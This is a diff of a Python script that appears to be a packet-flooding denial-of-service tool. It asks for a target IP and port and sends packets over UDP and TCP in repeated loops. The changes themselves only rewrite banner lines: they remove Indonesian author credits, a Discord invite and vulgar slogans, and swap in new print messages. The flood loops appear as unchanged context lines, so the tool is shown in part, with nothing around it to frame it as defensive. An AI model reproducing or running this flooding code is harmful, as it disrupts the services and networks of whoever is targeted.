@@ -4,13 +4,7 @@ import socket
 import threading
 
 print       (" - - > AUTHOR : XTraylinz    CODE : XTraylinz < - - ")
-print       (" - - > XTraylinz x XNextTime NIH BOS!! < - - ")
-print       (" - - > AJARIN CUPU DONG BANG XIXI < - - ")
-print       (" - - > XTraylinz#0965 & XNextTime#4668 <- - ")                                   
-print       (" - - > KALO MAU RENAME PM GUA DULU NGENTOD < - - ")
-print       (" - - > PENCET LINK DIBAWAH AJG < - - ")
-print       (" - - > https://discord.gg/CEbs6UFgga < - - ")
-print       (" - - > GA JOIN = ANAK HARAM < - - ")
+print       (" - - >      READY NIH GAS KAN BRE HAJAR       < - - ")
     
 ip = str(input("  Ip Nya:"))
 port = int(input(" Port Nya:"))
@@ -26,7 +20,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" XTraylinz x XNextTime NIH BOS !! ")
+			print(i +" PAKET !! ")
 		except:
 			print("[!] GASUKA BAYWAN DECK")
 
@@ -40,7 +34,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" XTraylinz x XNextTime NIH BOS !! ")
+			print(i +" PAKET !! ")
 		except:
 			s.close()
 			print("[*] GASUKA BAYWAN DECK")
